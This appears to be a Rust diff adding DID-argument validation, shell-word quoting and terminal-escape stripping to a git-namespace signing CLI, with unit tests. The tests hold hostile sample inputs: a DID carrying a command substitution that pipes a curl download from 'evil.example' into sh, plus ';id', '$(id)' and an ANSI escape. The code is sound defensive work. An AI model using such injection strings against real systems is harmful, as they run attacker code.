@@ -329,8 +329,45 @@ fn signing_key(keyring_key: &str) -> CliResult<(String, HolderKey)> {
 
 /// The fix for a refusal, where the operator's intent maps onto another
 /// command.
+/// A DID argument, checked as DID-core has it before anything is signed:
+/// what the VTC would refuse, and what could not be pasted safely, is caught
+/// here with the reason.
+fn did_arg(label: &str, value: &str) -> CliResult<String> {
+    vta_sdk::identifier::validate_did_core(label, value)?;
+    Ok(value.to_string())
+}
+
+/// `s` as one POSIX shell word: unchanged when it holds nothing a shell
+/// interprets, otherwise single-quoted. Every value this module puts into a
+/// command it prints goes through here, so a printed command can be pasted
+/// as it stands.
+fn shell_word(s: &str) -> String {
+    let plain = !s.is_empty()
+        && s.bytes().all(|b| {
+            b.is_ascii_alphanumeric()
+                || matches!(
+                    b,
+                    b'.' | b'_' | b'-' | b'/' | b':' | b'@' | b'%' | b'+' | b'=' | b','
+                )
+        });
+    if plain {
+        s.to_string()
+    } else {
+        format!("'{}'", s.replace('\'', "'\\''"))
+    }
+}
+
+/// Text from elsewhere (the VTC's refusal message, a DID) made safe to print
+/// to a terminal: control characters, escapes included, are shown as `?`.
+fn terminal_safe(s: &str) -> String {
+    s.chars()
+        .map(|c| if c.is_control() { '?' } else { c })
+        .collect()
+}
+
 fn guidance(code: &str, message: &str, did: &str) -> String {
-    let bin = bin_name();
+    let bin = shell_word(bin_name());
+    let (message, did) = (terminal_safe(message), terminal_safe(did));
     let hint = match code {
         "git-ns:lastOwner" => format!(
             "\nA repository always keeps an owner. Name another first:\n  {bin} git grant \
@@ -524,6 +561,7 @@ pub async fn run(command: GitCommands, keyring_key: &str, target: &VtcTarget) ->
             expires_in,
             reason,
         } => {
+            let subject = did_arg("--subject", &subject)?;
             let (did, key) = signing_key(keyring_key)?;
             let mut payload = json!({
                 "subject": subject,
@@ -552,6 +590,7 @@ pub async fn run(command: GitCommands, keyring_key: &str, target: &VtcTarget) ->
             resource,
             reason,
         } => {
+            let subject = did_arg("--subject", &subject)?;
             let (did, key) = signing_key(keyring_key)?;
             let mut payload = json!({
                 "subject": subject,
@@ -613,6 +652,7 @@ pub async fn run(command: GitCommands, keyring_key: &str, target: &VtcTarget) ->
             Ok(())
         }
         GitCommands::Transfer { resource, to } => {
+            let to = did_arg("--to", &to)?;
             let (did, key) = signing_key(keyring_key)?;
             let resp = anon()
                 .git_ns_transfer(&resource.to_lowercase(), &to, &key)
@@ -629,6 +669,9 @@ pub async fn run(command: GitCommands, keyring_key: &str, target: &VtcTarget) ->
             show(&resp)
         }
         GitCommands::Adopt { resource, owners } => {
+            for o in &owners {
+                did_arg("--owner", o)?;
+            }
             let (did, key) = signing_key(keyring_key)?;
             let resp = anon()
                 .git_ns_adopt(&resource.to_lowercase(), &owners, &key)
@@ -684,6 +727,7 @@ pub async fn run(command: GitCommands, keyring_key: &str, target: &VtcTarget) ->
             subject,
             statement,
         } => {
+            let subject = did_arg("--subject", &subject)?;
             let (did, key) = signing_key(keyring_key)?;
             let resp = anon()
                 .git_ns_reseat(&namespace, &subject, &statement, &key)
@@ -817,6 +861,35 @@ mod tests {
     fn a_not_revertible_refusal_explains_the_bridge_version() {
         let g = guidance("git-ns/drift/resolve:notRevertible", "refused", "did:key:z");
         assert!(g.contains("bridge/job 0.1"), "{g}");
+    }
+
+    #[test]
+    fn a_did_argument_that_is_not_did_core_is_refused_before_signing() {
+        for bad in [
+            "did:web:x.example$(curl${IFS}-s${IFS}evil.example|sh)",
+            "did:web:x;id",
+            "did:web:x y",
+            "did:web:x#k-1",
+        ] {
+            assert!(did_arg("--subject", bad).is_err(), "{bad}");
+        }
+        assert!(did_arg("--subject", "did:webvh:QmScid:acme-vtc.example:bob").is_ok());
+    }
+
+    #[test]
+    fn printed_commands_quote_what_a_shell_would_interpret() {
+        assert_eq!(shell_word("cnm"), "cnm");
+        assert_eq!(
+            shell_word("did:webvh:QmScid:acme.example"),
+            "did:webvh:QmScid:acme.example"
+        );
+        assert_eq!(shell_word("a b"), "'a b'");
+        assert_eq!(shell_word("$(id)"), "'$(id)'");
+        assert_eq!(shell_word("it's"), "'it'\\''s'");
+        assert_eq!(shell_word(""), "''");
+        // A refusal's text reaches the terminal without its control bytes.
+        let g = guidance("git-ns:lastOwner", "evil\u{1b}[2Jmsg", "did:key:z\u{7}");
+        assert!(!g.chars().any(|c| c.is_control() && c != '\n'), "{g:?}");
     }
 
     #[test]
